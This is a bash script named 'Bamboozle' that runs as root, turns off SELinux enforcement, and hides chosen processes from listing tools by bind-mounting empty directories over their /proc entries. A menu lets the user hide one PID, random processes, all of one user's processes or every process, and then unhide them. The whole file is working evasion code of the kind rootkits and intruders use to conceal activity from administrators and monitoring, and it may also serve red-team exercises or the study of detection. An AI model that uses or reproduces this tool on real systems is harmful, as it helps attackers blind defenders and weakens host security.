#!/bin/bash

# Bamboozle (bambam)
# Logan Upchurch

# quit if not run as root
if [ "$EUID" -ne 0 ]; then
	echo "This script only works as root"
	exit -1
fi

setenforce 0

# make test empty folder in /tmp
DIR="/tmp/bam"
PDIR="/tmp"
mkdir -p $DIR

# if it can't, make test empty folder in /usr/bin
if [ $? -ne 0 ]; then
	DIR="/usr/bin/bam"
	PDIR="/usr/bin"
	mkdir -p $DIR
	
	# if it can't, quit
	if [ $? -ne 0 ]; then
		echo "Script failed"
		exit -2
	fi
	
	rmdir $DIR 2> /dev/null
fi

# remove test folder
rmdir $DIR 2> /dev/null

prefix="bam"

while :
do
	# clear the terminal and print the menu
	clear
	printf "*********************\n"
	printf "***** BAMBOOZLE *****\n"
	printf "*********************\n\n"
	
	printf "The empty directory is: $DIR\n\n"
	
	printf "Enter selection:\n"
	printf "1) Hide a specific process\n"
	printf "2) Hide random processes\n"
	printf "3) Hide all processes for a specific user\n"
	printf "4) Hide all processes\n"
	printf "5) Unhide all hidden processes\n"
	printf "q to quit\n\n"
	
	if [ "$opt" = "no" ]; then
		printf "Invalid option\n"
	else
		printf "\n"
	fi

	# get input
	printf "#?"
	read opt

	case $opt in
		# hide a specific process
		1)
			while :
			do
				# prompt for process PID
				clear
				printf "Enter the PID of the process you want to hide (q to menu)\n"
				printf "(If you're unsure, do ps -ef)\n"
				read pid
				
				# return to menu
				if [ "$pid" == "q" ] || [ "$pid" == "Q" ]; then
					break
				fi
				
				# make an empty directory and bind mount the process PID dir to that directory
				mkdir -p ${DIR}${pid}
				mount -o bind ${DIR}${pid} /proc/$pid
				
				# failure, loop back to prompt
				if [ $? -ne 0 ]; then
					printf "Mount failed. Press any key to try again\n"
					read -n 1 -s
				# success
				else
					printf "Success. Press any key to return to menu\n"
					read -n 1 -s
					break
				fi
			done
			opt="yes"
			;;
		# hide random processes
		2)
			# prompt for decision
			clear
			printf "Are you sure you want to hide random processes?\n"
			printf "[y/n]?"
			read in
			
			# you have chosen yes
			if [ "$in" == "y" ] || [ "$in" == "Y" ]; then
				printf "Hiding random processes...\n"
				
				# get the PIDs from process list
				ps -ef | awk '{print $2}' | while read pid
				do
					# get random number
					rand=$(shuf -i 1-50 -n1)
					
					# first line is "PID", ignore
					if [ "$pid" != "PID" ]; then
						# 50% chance of hiding the process
						if [ $rand -gt 24 ]; then
							# make an empty directory and bind mount the process PID dir to that directory	
							mkdir -p ${DIR}${pid}
							mount -o bind ${DIR}${pid} /proc/$pid
							
							# failure
							if [ $? -ne 0 ]; then
								printf "Mount failed for /proc/$pid\n"
							# success
							else
								printf "Process $pid hidden\n"
							fi
						fi
					fi
				done
			# you have chosen no
			else
				printf "No processes hidden\n"
			fi
			
			printf "Done. Press any key to return to menu\n"
			read -n 1 -s
			opt="yes"
			;;
		# hide all processes for a specific user
		3)
			while :
			do
				# prompt for user name
				clear
				printf "Enter the user whose processes you want to hide (q to menu)\n"
				printf "(If you're unsure, do ps -ef)\n"
				read user
				
				# return to menu
				if [ "$user" == "q" ] || [ "$user" == "Q" ]; then
					break
				fi
				
				# check if the user exists
				if [ ! -z "$(cat /etc/passwd | cut -d: -f1 | grep -w $user)" ]; then
					# check if the user is running any processes
					if [ ! -z "$(ps -ef | awk '{print $1}' | grep -w $user)" ]; then
						printf "Hiding $user's processes...\n"
						
						# get the PIDs from the process list
						ps -ef | awk '{print $1,$2}' | grep -w $user | awk '{print $2}' | while read pid
						do
							# make an empty directory and bind mount the process PID dir to that directory	
							mkdir -p ${DIR}${pid}
							mount -o bind ${DIR}${pid} /proc/$pid
							
							# failure
							if [ $? -ne 0 ]; then
								printf "Mount failed for /proc/$pid\n"
							# success
							else
								printf "Process $pid hidden\n"
							fi
						done
					# user is not running any processes
					else
						printf "User $user has no visible processes running\n"
					fi
				# user does not exist
				else
					printf "User $user does not exist\n"
				fi
				
				break
			done
			
			printf "Done. Press any key to return to menu\n"
			read -n 1 -s
			opt="yes"
			;;
		# hide all processes
		4)
			# prompt for decision
			clear
			printf "Are you sure you want to hide all processes?\n"
			printf "[y/n]?"
			read in
			
			# you have chosen yes
			if [ "$in" == "y" ] || [ "$in" == "Y" ]; then
				printf "Hiding all processes...\n"
				
				# get the PIDs from process list
				ps -ef | awk '{print $2}' | while read pid
				do
					# first line is "PID", ignore
					if [ "$pid" != "PID" ]; then
						# make an empty directory and bind mount the process PID dir to that directory	
						mkdir -p ${DIR}${pid}
						mount -o bind ${DIR}${pid} /proc/$pid
						
						# failure
						if [ $? -ne 0 ]; then
							printf "Mount failed for /proc/$pid\n"
						# success
						else
							printf "Process $pid hidden\n"
						fi
					fi
				done
			# you have chosen no
			else
				printf "No processes hidden\n"
			fi
			
			printf "Done. Press any key to return to menu\n"
			read -n 1 -s
			opt="yes"
			;;
		# unhide all hidden processes
		5)
			# prompt for decision
			clear
			printf "Are you sure you want to hide all processes?\n"
			printf "[y/n]?"
			read in
			
			# you have chosen yes
			if [ "$in" == "y" ] || [ "$in" == "Y" ]; then
				printf "Unhiding all hidden processes...\n"
				
				# find hidden processes
				ls -1 $PDIR | grep bam | while read line
				do
					# get the pid
					pid=${line#"$prefix"}
					# unmount the process
					umount /proc/$pid
					printf "Process $pid unhidden\n"
				done
			# you have chosen no
			else
				printf "No processes unhidden\n"
			fi
			
			printf "Done. Press any key to return to menu\n"
			read -n 1 -s
			opt="yes"
			;;
		# quit
		q | Q)
			break
			;;
		# invalid option
		*)
			opt="no"
			;;
	esac
done

clear
	

